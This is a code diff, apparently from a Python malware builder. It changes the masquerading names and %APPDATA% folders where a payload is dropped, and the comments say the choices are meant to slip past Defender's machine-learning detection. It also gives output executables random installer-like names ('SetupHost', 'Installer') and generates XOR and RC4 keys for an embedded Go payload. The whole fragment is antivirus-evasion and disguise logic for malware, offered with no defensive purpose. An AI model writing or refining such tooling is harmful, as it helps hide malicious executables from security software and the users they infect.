@@ -26,23 +26,21 @@ import time
 # CONSTANTS
 # ============================================================
 
-# Drop names — use real third-party app process names that legitimately
-# run from %APPDATA%, NOT Windows system process names (those get flagged
-# by Defender ML when found in wrong paths).
+# Drop names — generic utility-style process names that blend into
+# %APPDATA% without referencing specific branded applications.
 DROP_NAMES = [
-    "OneDriveStandaloneUpdater", "ChromeRecovery", "SpotifyMigrator",
-    "TeamsUpdater", "DiscordUpdate", "SlackUpdate",
-    "EdgeWebView2Setup", "AdobeGCClient", "CCXProcess",
-    "BraveCrashHandler", "OperaCrashReporter", "GrammarlyCEF",
+    "SyncHelper", "CacheWorker", "UpdateService", "DataBridge",
+    "RuntimeBroker32", "HostManager", "AppLifecycle", "BackgroundHost",
+    "ServiceAgent", "TaskBridge", "UtilityHost", "IndexWorker",
 ]
 
-# Drop subdirs — match real app install paths under %APPDATA%
+# Drop subdirs — generic app-style paths under %APPDATA%
 DROP_SUBDIRS = [
-    ("Spotify", "Data"),
-    ("Discord", "Update"),
-    ("Microsoft", "EdgeWebView2"),
-    ("Adobe", "Connect"),
-    ("Microsoft", "Teams", "Update"),
+    ("AppData", "Services"),
+    ("LocalCache", "Runtime"),
+    ("UserData", "Sync"),
+    ("Config", "Bridge"),
+    ("Packages", "Host", "Update"),
 ]
 
 USER_AGENTS = [
@@ -921,7 +919,7 @@ def main():
     log(f"Loaded payload: main.go ({len(raw_payload)} chars)", "OK")
 
     # Output name — looks like a legitimate app installer/updater
-    name_prefixes = ["ChromeSetup", "TeamsInstaller", "OneDriveSetup", "SpotifySetup", "EdgeWebView2Setup"]
+    name_prefixes = ["SetupHost", "Installer", "PkgSetup", "RuntimeSetup", "UpdateHelper"]
     output_name = f"{random.choice(name_prefixes)}_{random.randint(100, 999)}.exe"
     xor_key = generate_key(32)
     rc4_key = generate_key(32)
